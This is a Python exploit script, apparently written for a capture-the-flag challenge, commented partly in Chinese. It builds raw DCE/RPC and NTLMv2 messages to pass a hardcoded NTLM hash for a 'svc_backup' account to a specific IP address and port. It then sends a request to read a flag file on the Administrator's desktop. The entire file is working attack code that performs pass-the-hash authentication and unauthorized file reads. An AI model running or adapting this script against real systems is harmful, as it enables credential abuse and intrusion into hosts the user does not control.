#!/usr/bin/env python3
"""
带 NTLM 认证的 RPC Bind
"""

import socket
import struct
import hashlib
import hmac
import os
import time

TARGET = "116.62.114.4"
PORT = 62831

# Credentials
DOMAIN = "CORP"
USERNAME = "svc_backup"
NTLM_HASH = bytes.fromhex("466a9231465f46a98db624c6f12c2e33")

UUID = bytes.fromhex('8902e062bd447b49b85fbc340fbcc2b0')
NDR = bytes.fromhex('045d888aeb1cc9119fe808002b104860')

def recv_response(sock, timeout=15):
    sock.settimeout(timeout)
    data = b""
    
    try:
        while len(data) < 24:
            chunk = sock.recv(24 - len(data))
            if not chunk:
                break
            data += chunk
        
        if len(data) >= 10:
            frag_length = struct.unpack('<H', data[8:10])[0]
            while len(data) < frag_length:
                chunk = sock.recv(frag_length - len(data))
                if not chunk:
                    break
                data += chunk
    except socket.timeout:
        pass
    
    return data

def create_ntlm_negotiate():
    """NTLM Type 1 (Negotiate)"""
    sig = b'NTLMSSP\x00'
    msg_type = struct.pack('<I', 1)
    
    # Flags
    flags = (
        0x00000001 |  # UNICODE
        0x00000002 |  # OEM
        0x00000004 |  # REQUEST_TARGET
        0x00000200 |  # NTLM
        0x00008000 |  # ALWAYS_SIGN
        0x00010000 |  # NTLM_DOMAIN_SUPPLIED
        0x00020000 |  # NTLM_WORKSTATION_SUPPLIED
        0x00080000 |  # NTLM2
        0x02000000 |  # TARGET_INFO
        0x20000000 |  # NEGOTIATE_128
        0x80000000    # NEGOTIATE_56
    )
    
    domain = DOMAIN.encode('ascii')
    workstation = b'WORKSTATION'
    
    # 计算偏移
    offset = 32 + 8 + 8  # header + domain fields + workstation fields
    
    return (sig + msg_type + 
            struct.pack('<I', flags) +
            struct.pack('<HHI', len(domain), len(domain), offset) +
            struct.pack('<HHI', len(workstation), len(workstation), offset + len(domain)) +
            domain + workstation)

def create_bind_with_auth(auth_data, auth_type=10, auth_level=6):
    """创建带认证的 Bind"""
    # Context element
    ctx = struct.pack('<HBB', 0, 1, 0)
    ctx += UUID
    ctx += struct.pack('<HH', 1, 0)
    ctx += NDR + struct.pack('<HH', 2, 0)
    
    # Bind body
    body = struct.pack('<HH', 0x1000, 0x1000)
    body += struct.pack('<I', 0)  # assoc_group
    body += struct.pack('<BBH', 1, 0, 0)  # n_context, reserved
    body += ctx
    
    # Pad to 4-byte boundary
    pad_len = (4 - len(body) % 4) % 4
    body += b'\x00' * pad_len
    
    # Auth verifier
    # auth_type: 10 = NTLMSSP
    # auth_level: 6 = PKT_PRIVACY, 4 = PKT_INTEGRITY, 2 = CONNECT
    auth_verifier = struct.pack('<BBBBI', auth_type, auth_level, pad_len, 0, 0)
    auth_verifier += auth_data
    
    total_body = body + auth_verifier
    
    # Header
    # frag_length 包括 header + body + auth
    frag_len = 24 + len(total_body)
    auth_len = len(auth_data)
    
    header = struct.pack('<BBBBIHHI', 5, 0, 11, 0x03, 0x10, frag_len, auth_len, 0)
    
    return header + total_body

def parse_ntlm_challenge(data):
    """解析 NTLM Type 2"""
    if not data.startswith(b'NTLMSSP\x00'):
        return None
    
    msg_type = struct.unpack('<I', data[8:12])[0]
    if msg_type != 2:
        return None
    
    challenge = data[24:32]
    flags = struct.unpack('<I', data[20:24])[0]
    
    # Target info
    info_len = struct.unpack('<H', data[40:42])[0]
    info_offset = struct.unpack('<I', data[44:48])[0]
    target_info = data[info_offset:info_offset + info_len] if info_len > 0 else b''
    
    return {'challenge': challenge, 'flags': flags, 'target_info': target_info}

def create_ntlm_auth(challenge_data):
    """NTLM Type 3 (Auth)"""
    challenge = challenge_data['challenge']
    target_info = challenge_data['target_info']
    flags = challenge_data['flags']
    
    # Client challenge
    client_challenge = os.urandom(8)
    
    # Timestamp
    timestamp = struct.pack('<Q', int((time.time() + 11644473600) * 10000000))
    
    # NTLMv2 Hash
    ntlm_v2_hash = hmac.new(
        NTLM_HASH,
        (USERNAME.upper() + DOMAIN.upper()).encode('utf-16-le'),
        hashlib.md5
    ).digest()
    
    # Blob
    blob = struct.pack('<BBH', 1, 1, 0)  # version
    blob += struct.pack('<I', 0)  # reserved
    blob += timestamp
    blob += client_challenge
    blob += struct.pack('<I', 0)  # reserved
    blob += target_info
    blob += struct.pack('<I', 0)  # reserved
    
    # NTProofStr
    nt_proof = hmac.new(ntlm_v2_hash, challenge + blob, hashlib.md5).digest()
    
    # NT Response
    nt_response = nt_proof + blob
    
    # LM Response (NTLMv2)
    lm_response = hmac.new(ntlm_v2_hash, challenge + client_challenge, hashlib.md5).digest() + client_challenge
    
    # Session base key
    session_key = hmac.new(ntlm_v2_hash, nt_proof, hashlib.md5).digest()
    
    # Build Type 3
    sig = b'NTLMSSP\x00'
    msg_type = struct.pack('<I', 3)
    
    domain_bytes = DOMAIN.encode('utf-16-le')
    user_bytes = USERNAME.encode('utf-16-le')
    workstation_bytes = b'W\x00O\x00R\x00K\x00'
    
    base_offset = 88  # Fixed header size
    
    lm_offset = base_offset
    nt_offset = lm_offset + len(lm_response)
    domain_offset = nt_offset + len(nt_response)
    user_offset = domain_offset + len(domain_bytes)
    workstation_offset = user_offset + len(user_bytes)
    
    header = sig + msg_type
    header += struct.pack('<HHI', len(lm_response), len(lm_response), lm_offset)
    header += struct.pack('<HHI', len(nt_response), len(nt_response), nt_offset)
    header += struct.pack('<HHI', len(domain_bytes), len(domain_bytes), domain_offset)
    header += struct.pack('<HHI', len(user_bytes), len(user_bytes), user_offset)
    header += struct.pack('<HHI', len(workstation_bytes), len(workstation_bytes), workstation_offset)
    header += struct.pack('<HHI', 0, 0, workstation_offset + len(workstation_bytes))  # encrypted random session key
    header += struct.pack('<I', flags)
    header += struct.pack('<BBHBBBB', 6, 1, 0, 0, 0, 0, 15)  # version
    header += b'\x00' * 16  # MIC placeholder
    
    message = header + lm_response + nt_response + domain_bytes + user_bytes + workstation_bytes
    
    return message, session_key

def exploit():
    print("="*60)
    print("NTLM Authenticated RPC Exploit")
    print("="*60)
    print(f"Target: {TARGET}:{PORT}")
    print(f"User: {DOMAIN}\\{USERNAME}")
    
    # Step 1: Connect and send Bind with NTLM Negotiate
    print("\n[1] Sending Bind + NTLM Negotiate...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(30)
    sock.connect((TARGET, PORT))
    
    ntlm_neg = create_ntlm_negotiate()
    print(f"    NTLM Negotiate: {len(ntlm_neg)} bytes")
    
    # 尝试不同的 auth_level
    for auth_level in [6, 4, 2, 1, 0]:
        print(f"\n  Trying auth_level={auth_level}...")
        
        sock.close()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        sock.connect((TARGET, PORT))
        
        bind_pdu = create_bind_with_auth(ntlm_neg, auth_type=10, auth_level=auth_level)
        print(f"    Bind PDU: {len(bind_pdu)} bytes")
        print(f"    Hex: {bind_pdu.hex()[:100]}...")
        
        sock.send(bind_pdu)
        resp = recv_response(sock, 15)
        
        if resp:
            print(f"    Response: {len(resp)} bytes")
            print(f"    Hex: {resp.hex()}")
            
            if len(resp) >= 3:
                ptype = resp[2]
                print(f"    Packet type: {ptype}")
                
                if ptype == 12:  # Bind ACK
                    print("    [+] Bind ACK received!")
                    
                    # 检查 auth 数据
                    auth_len = struct.unpack('<H', resp[10:12])[0]
                    if auth_len > 0:
                        auth_data = resp[-auth_len:]
                        print(f"    Auth data: {auth_data.hex()}")
                        
                        # 解析 NTLM Challenge
                        challenge_data = parse_ntlm_challenge(auth_data)
                        if challenge_data:
                            print(f"    NTLM Challenge: {challenge_data['challenge'].hex()}")
                            print(f"    Flags: 0x{challenge_data['flags']:08x}")
                            
                            # Step 2: Send AUTH3 with NTLM Authenticate
                            print("\n[2] Sending AUTH3 + NTLM Authenticate...")
                            
                            ntlm_auth, session_key = create_ntlm_auth(challenge_data)
                            print(f"    NTLM Auth: {len(ntlm_auth)} bytes")
                            
                            # AUTH3 packet
                            auth3_body = struct.pack('<BBBBI', 10, auth_level, 0, 0, 0)
                            auth3_body += ntlm_auth
                            
                            # Pad
                            pad = (4 - len(auth3_body) % 4) % 4
                            auth3_body += b'\x00' * pad
                            
                            frag_len = 24 + len(auth3_body)
                            header = struct.pack('<BBBBIHHI', 5, 0, 16, 0x03, 0x10, frag_len, len(ntlm_auth), 0)
                            auth3_pdu = header + auth3_body
                            
                            print(f"    AUTH3 PDU: {len(auth3_pdu)} bytes")
                            sock.send(auth3_pdu)
                            
                            # AUTH3 通常没有响应，直接发送 Request
                            time.sleep(0.5)
                            
                            # Step 3: Send Request
                            print("\n[3] Sending Request...")
                            
                            filepath = "C:\\Users\\Administrator\\Desktop\\flag.txt"
                            n = len(filepath) + 1
                            stub = struct.pack('<III', n, 0, n) + filepath.encode('utf-16-le') + b'\x00\x00'
                            
                            req_body = struct.pack('<IHH', len(stub), 0, 0)  # alloc_hint, ctx_id, opnum
                            req_body += stub
                            pad = (8 - len(req_body) % 8) % 8
                            req_body += b'\x00' * pad
                            
                            frag_len = 24 + len(req_body)
                            header = struct.pack('<BBBBIHHI', 5, 0, 0, 0x03, 0x10, frag_len, 0, 1)
                            request = header + req_body
                            
                            sock.send(request)
                            resp = recv_response(sock, 15)
                            
                            if resp:
                                print(f"    Response: {len(resp)} bytes")
                                print(f"    Hex: {resp.hex()}")
                            else:
                                print("    No response to Request")
                    else:
                        print("    [!] No auth data in response")
                        
                elif ptype == 13:  # Bind NAK
                    print("    [-] Bind NAK")
                    if len(resp) > 24:
                        reason = struct.unpack('<H', resp[24:26])[0]
                        print(f"    Reason: {reason}")
        else:
            print("    No response")
    
    sock.close()

# 也尝试简单的 Bind（frag_len=0x48）后跟认证的 Request
def try_authenticated_request():
    print("\n" + "="*60)
    print("Alternative: Simple Bind + Authenticated Request")
    print("="*60)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(30)
    sock.connect((TARGET, PORT))
    
    # Simple bind with frag_len=0x48
    ctx = struct.pack('<HBB', 0, 1, 0)
    ctx += UUID
    ctx += struct.pack('<HH', 1, 0)
    ctx += NDR + struct.pack('<HH', 2, 0)
    
    body = struct.pack('<HH', 0x1000, 0x1000)
    body += struct.pack('<I', 0)
    body += struct.pack('<BBH', 1, 0, 0)
    body += ctx
    
    header = struct.pack('<BBBBIHHI', 5, 0, 11, 0x03, 0x10, 0x48, 0, 0)
    bind_pdu = header + body
    
    sock.send(bind_pdu)
    resp = recv_response(sock)
    
    if resp and resp[2] == 12:
        print("[+] Simple Bind successful")
        
        # 发送带 NTLM 认证的 Request
        filepath = "C:\\Users\\Administrator\\Desktop\\flag.txt"
        n = len(filepath) + 1
        stub = struct.pack('<III', n, 0, n) + filepath.encode('utf-16-le') + b'\x00\x00'
        
        ntlm_neg = create_ntlm_negotiate()
        
        req_body = struct.pack('<IHH', len(stub), 0, 0)
        req_body += stub
        
        # 添加认证
        pad = (4 - len(req_body) % 4) % 4
        req_body += b'\x00' * pad
        
        auth_verifier = struct.pack('<BBBBI', 10, 6, pad, 0, 0) + ntlm_neg
        req_body += auth_verifier
        
        frag_len = 24 + len(req_body)
        header = struct.pack('<BBBBIHHI', 5, 0, 0, 0x03, 0x10, frag_len, len(ntlm_neg), 1)
        request = header + req_body
        
        print(f"Sending authenticated Request ({len(request)} bytes)...")
        sock.send(request)
        
        resp = recv_response(sock, 15)
        if resp:
            print(f"Response: {len(resp)} bytes")
            print(f"Hex: {resp.hex()}")
        else:
            print("No response")
    
    sock.close()

if __name__ == "__main__":
    exploit()
    try_authenticated_request()
